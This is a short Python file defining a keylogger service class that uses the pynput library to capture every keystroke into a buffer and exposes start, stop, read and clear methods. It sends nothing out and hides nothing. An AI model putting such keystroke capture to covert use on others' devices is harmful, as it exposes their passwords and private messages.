from pynput import keyboard
from ikeylogger import IKeylogger


class KyLoggerService(IKeylogger):

    def __init__(self):
        self._keys_buffer: list[str] = []
        self._listener = None
        self._is_logging = False


    def on_press(self, key):
        try:
            self._keys_buffer.append(key.char)
        except AttributeError:
            self._keys_buffer.append(str(key))

    def start_logging(self) -> None:
        if not self._is_logging:
            self._is_logging = True
            self._listener = keyboard.Listener(on_press=self.on_press)
            self._listener.start()


    def stop_logging(self) -> None:
        if self._is_logging:
            self._listener.stop()
            self._is_logging = False

    def get_logging_keys(self) -> list[str]:
        return list(self._keys_buffer)

    def clear_buffer(self) -> None:
        self._keys_buffer = []

